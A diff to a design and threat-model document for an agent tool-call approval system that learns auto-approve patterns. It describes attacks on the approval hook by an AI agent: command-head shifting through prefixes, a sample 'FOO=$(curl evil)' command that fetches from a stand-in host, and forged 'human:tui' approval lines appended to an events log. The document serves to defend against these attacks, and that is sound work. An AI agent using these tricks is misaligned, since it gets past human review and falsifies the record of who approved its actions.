@@ -486,7 +486,9 @@ Today's `tool_rules.*.allow_patterns` are **case-insensitive substring** matches
 - Learned Write/Edit rules match on canonicalized absolute path prefix + extension, never substring.
 - The learner **never** emits entries into the existing `allow_patterns` substring arrays.
 
-**Attack closed:** comment/argument smuggling — appending a learned token anywhere in a hostile command.
+**Parser soundness (load-bearing).** The anchor is only sound if the hook's "first command" extraction is a *superset* of what the executing shell would treat as the first command — anything the hook mis-identifies as the command head is an escape. The extractor must therefore account for constructs that shift or hide the command head: leading `VAR=value` assignments (`FOO=x cargo test` — the command is `cargo`, not `FOO=x`), leading assignments with expansion (`FOO=$(curl evil) cargo test` — already Caution via I3's `$()` rule, but the extractor must not silently treat `FOO=...` as the command), `env`/`command`/`nice`/`time` prefixes, brace/subshell groups, and IFS/quoting tricks. Whenever the extractor cannot confidently resolve the command head to a bare token, it returns *no match* (fall through to human review) rather than guessing — an ambiguous parse is a miss, and per the fail-closed default a miss must never auto-approve. Pin these cases as explicit tests before the rule type ships.
+
+**Attack closed:** comment/argument smuggling — appending a learned token anywhere in a hostile command — and command-head shifting via assignment/wrapper prefixes.
 
 ### I3 — Sus evaluation runs at decision time, in the hook
 
@@ -502,11 +504,11 @@ Learn-time classification is insufficient: `cargo test` may be Clean as a *patte
 
 Rows counted toward a pattern's confidence must satisfy **all** of:
 
-- **Daemon-witnessed:** resolved through the daemon's own oneshot resolution path. Rows ingested from `events.jsonl` are excluded — the hook (and any process running as the user, i.e. any agent) can append to that file, so it is forgeable training data.
-- **Individually reviewed:** `decided_by = human` with per-item resolution. **Bulk approvals are excluded** — a bulk approve is queue hygiene, not a per-call judgment. This requires `decided_by` to distinguish `human:individual` from `human:bulk` (small daemon change; note in itr).
+- **Daemon-witnessed — key on the `auto_approved` column, NOT the `decided_by` text.** The sound, unforgeable handle already exists in the schema: every row the daemon ingests from `events.jsonl` is written with `auto_approved = 1` regardless of the `decided_by` string in the appended line (`decisions.rs` forces it), while decisions the daemon resolves through its own oneshot path keep `auto_approved = 0`. Evidence therefore selects on `auto_approved = 0` alone. **Do not** filter on `decided_by = human`: `decided_by` is copied verbatim from the `events.jsonl` line by `ingest_line`, so an agent can append `{"event":"auto_approved","decided_by":"human:tui",...}` and — although it lands as `auto_approved = 1` and is thus excluded from learning — the forged `human:*` label would otherwise surface in `wisphive audit`. Two hardening asks fall out and are filed: (1) the learning query keys on `auto_approved = 0`; (2) `ingest_line` rejects/relabels any ingested `decided_by` beginning `human:` or `timeout:` so forged operator attribution can never enter the audit stream.
+- **Individually reviewed:** among `auto_approved = 0` rows, exclude bulk resolutions — a bulk approve is queue hygiene, not a per-call judgment. Today `decided_by` is `human:tui` / `human:web:<id>` and does not distinguish bulk from individual; add that axis (itr#426). Note this is the *same field* as I7's `human:<resolver>` provenance — one `decided_by` string encodes both resolver and bulk/individual (e.g. `human:tui:individual`); I4 and I7 must agree on its grammar.
 - **Unredacted:** rows whose `tool_input` contains the redaction marker (itr#89) are excluded — the true content is unknown, and learning a pattern containing `***REDACTED***` is meaningless at best.
 
-**Attacks closed:** forged approval history via `events.jsonl` appends; confidence inflation via the human's own bulk-approve habit; pattern extraction from content the system deliberately refused to persist.
+**Attacks closed:** forged approval history via `events.jsonl` appends (excluded by the `auto_approved` column, and forged `human:*` labels blocked at ingest); confidence inflation via the human's own bulk-approve habit; pattern extraction from content the system deliberately refused to persist.
 
 ### I5 — Diversity thresholds resist manufactured evidence
 
